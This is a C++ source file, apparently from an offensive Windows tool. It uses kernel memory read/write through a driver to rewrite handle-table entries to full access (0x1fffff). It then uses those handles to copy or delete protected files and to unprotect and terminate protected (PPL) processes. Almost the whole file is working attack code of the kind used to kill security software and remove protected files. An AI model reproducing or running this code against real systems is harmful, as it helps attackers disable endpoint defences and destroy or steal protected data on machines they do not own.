#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <Psapi.h>

#include "DriverOps.h"
#include "FindOffset.h"
#include "HandleElevate.h"
#include "DisablePPL.h"


DWORD64 GetEprocessHandleTable(DWORD Pid) {
	ULONG_PTR pProcess;
	DWORD64 EprocessHandleTableAddress;
	GetProcessKernelAddress(Pid, &pProcess);
	Read64(pProcess + GetOffsets().ObjectTableOffset, &EprocessHandleTableAddress);
	return EprocessHandleTableAddress;
}


void ElevateHandle(DWORD64 hTableAddr, ULONGLONG hValue) {

	ULONG_PTR pSrcProcess, pDstProcess;
	UCHAR bSrcToken, bDstToken;
	UCHAR bProtectionLevel, bSignerType;

	BYTE SrcToken[8], DstToken[8];

	DWORD64 HandleTableEntry = GetHandleTableEntryAddress(hTableAddr, hValue);
	BYTE forentry[16];
	for (int i = 0; i < 16; i++) {
		BYTE tmp;
		Read8(HandleTableEntry + i, &tmp);
		forentry[i] = tmp;
	}
	HANDLE_TABLE_ENTRY* HandleTableEntryObject = (HANDLE_TABLE_ENTRY*)(void*)forentry;
	HandleTableEntryObject->GrantedAccess = 0x1fffff;
	BYTE NewHandle[16];
	std::memcpy(NewHandle, HandleTableEntryObject, 16);
	for (int i = 0; i < 16; i++)
	{
		DWORD NewHandleData = NewHandle[i];
		Write8(HandleTableEntry + i, NewHandleData);
	}
	printf("Elevated HANDLE to 0x1fffff bits\n");

}


BYTE* buffer_payload(HANDLE file, OUT size_t& r_size)
{

	HANDLE mapping = CreateFileMapping(file, 0, PAGE_READONLY, 0, 0, 0);
	if (!mapping) {
		std::cerr << "[X] Could not create mapping!" << std::endl;
		CloseHandle(file);
		return nullptr;
	}
	BYTE* dllRawData = (BYTE*)MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
	if (dllRawData == nullptr) {
		std::cerr << "[X] Could not map view of file" << std::endl;
		CloseHandle(mapping);
		CloseHandle(file);
		return nullptr;
	}
	r_size = GetFileSize(file, 0);
	BYTE* localCopyAddress = (BYTE*)VirtualAlloc(NULL, r_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (localCopyAddress == NULL) {
		std::cerr << "Could not allocate memory in the current process" << std::endl;
		return nullptr;
	}
	memcpy(localCopyAddress, dllRawData, r_size);
	UnmapViewOfFile(dllRawData);
	CloseHandle(mapping);
	return localCopyAddress;
}


HANDLE open_file(wchar_t* filePath)
{
	// convert to NT path
	std::wstring nt_path = L"\\??\\" + std::wstring(filePath);

	UNICODE_STRING file_name = { 0 };
	RtlInitUnicodeString(&file_name, nt_path.c_str());

	OBJECT_ATTRIBUTES attr = { 0 };
	InitializeObjectAttributes(&attr, &file_name, OBJ_CASE_INSENSITIVE, NULL, NULL);

	IO_STATUS_BLOCK status_block = { 0 };
	HANDLE file = INVALID_HANDLE_VALUE;
	NTSTATUS stat = NtOpenFile(&file,
		DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
		&attr,
		&status_block,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
	);
	if (!NT_SUCCESS(stat)) {
		std::cout << "Failed to open, status: " << std::hex << stat << std::endl;
		return INVALID_HANDLE_VALUE;
	}
	std::wcout << "Created temp file: " << filePath << "\n";
	return file;
}

HANDLE prep_payload_file(BYTE* payladBuf, DWORD payloadSize) {

	wchar_t dummy_name[MAX_PATH] = { 0 };
	wchar_t temp_path[MAX_PATH] = { 0 };
	DWORD size = GetTempPathW(MAX_PATH, temp_path);
	GetTempFileNameW(temp_path, L"TH", 0, dummy_name);

	wchar_t* filePath = dummy_name;

	HANDLE hFile = open_file(filePath);
	if (!hFile || hFile == INVALID_HANDLE_VALUE) {
		printf("Failed to create file: %0x%08x\n", GetLastError());
		return INVALID_HANDLE_VALUE;
	}


	IO_STATUS_BLOCK status_block = { 0 };

	NTSTATUS status = 0;

	LARGE_INTEGER ByteOffset = { 0 };

	status = WriteFile(
		hFile,
		payladBuf,
		payloadSize,
		NULL,
		NULL
	);
	if (!NT_SUCCESS(status)) {
		printf("WriteFile Status Error: %lx\n", status);
		return INVALID_HANDLE_VALUE;
	}
	std::cout << "Written!\n";

	return hFile;
}

bool CopyProtectedFile(LPCWSTR filePath) {
	FILE_DISPOSITION_INFORMATION Dispostion = { TRUE };
	IO_STATUS_BLOCK IoStatusBlock;

	DWORD currentPid = GetCurrentProcessId();

	wprintf(L"Openeing READ_CONTROL handle to %s\n", filePath);

	HANDLE fHandle = CreateFileW(filePath, READ_CONTROL, 0, 0, OPEN_EXISTING, 0, 0);
	if (fHandle == INVALID_HANDLE_VALUE) {
		printf("Unable to obtain a handle to file: %0x%08x\n", GetLastError());
		return false;
	}

	ElevateHandle(GetEprocessHandleTable(currentPid), (LONGLONG)fHandle);
	size_t payloadSize = 0;
	BYTE* payladBuf = buffer_payload(fHandle, payloadSize);
	prep_payload_file(payladBuf, payloadSize);

	CloseHandle(fHandle);
	return true;
}


bool DeleteProtectedFile(LPCWSTR filePath) {
	FILE_DISPOSITION_INFORMATION Dispostion = { TRUE };
	IO_STATUS_BLOCK IoStatusBlock;

	DWORD currentPid = GetCurrentProcessId();

	wprintf(L"Openeing READ_CONTROL handle to: %s\n", filePath);


	HANDLE fHandle = CreateFileW(filePath, READ_CONTROL, 0, 0, OPEN_EXISTING, 0, 0);
	if (fHandle == INVALID_HANDLE_VALUE) {
		printf("Unable to obtain a handle to file: %0x%08x\n", GetLastError());
		return false;
	}

	ElevateHandle(GetEprocessHandleTable(currentPid), (LONGLONG)fHandle);

	static auto NtSetInformationFile = (NtSetInformationFile_t)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtSetInformationFile");
	NTSTATUS status = NtSetInformationFile(fHandle, &IoStatusBlock, &Dispostion, sizeof(Dispostion), (FILE_INFORMATION_CLASS)13);
	if (!NT_SUCCESS(status)) {
		printf("SetInformationFile Status Error: %lx\n", status);
		return false;
	}
	CloseHandle(fHandle);

	wprintf(L"File %s deleted\n", filePath);

	return true;
}


bool TerminateProtectedProcess(DWORD Pid) {
	NTSTATUS r;

	printf("Got PID %d to terminate\n", Pid);
	DWORD currentPid = GetCurrentProcessId();

	CLIENT_ID id;
	id.UniqueProcess = (HANDLE)(DWORD_PTR)Pid;
	id.UniqueThread = (PVOID)0;
	OBJECT_ATTRIBUTES oa;
	HANDLE handle = 0;
	InitializeObjectAttributes(&oa, NULL, NULL, NULL, NULL);

	printf("Openeing PROCESS_QUERY_LIMITED_INFORMATION handle to: %d\n", Pid);

	static auto NtOpenProcess = (NtOpenProcess_t)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "NtOpenProcess");
	NTSTATUS status = NtOpenProcess(&handle, PROCESS_QUERY_LIMITED_INFORMATION, &oa, &id);
	//NTSTATUS status = NtOpenProcess(&handle, SYNCHRONIZE, &oa, &id);
	if (!NT_SUCCESS(status)) {
		printf("NtOpenProcess Status Error: %lx\n", status);
		return false;
	}
	if (handle == INVALID_HANDLE_VALUE) {
		printf("Unable to obtain a handle to process\n");
		return false;
	}

	ElevateHandle(GetEprocessHandleTable(currentPid), (ULONGLONG)handle);
	UnprotectProcess(Pid);
	TerminateProcess(handle, 0);
	printf("Process %d terminiated\n", Pid);

	return true;
}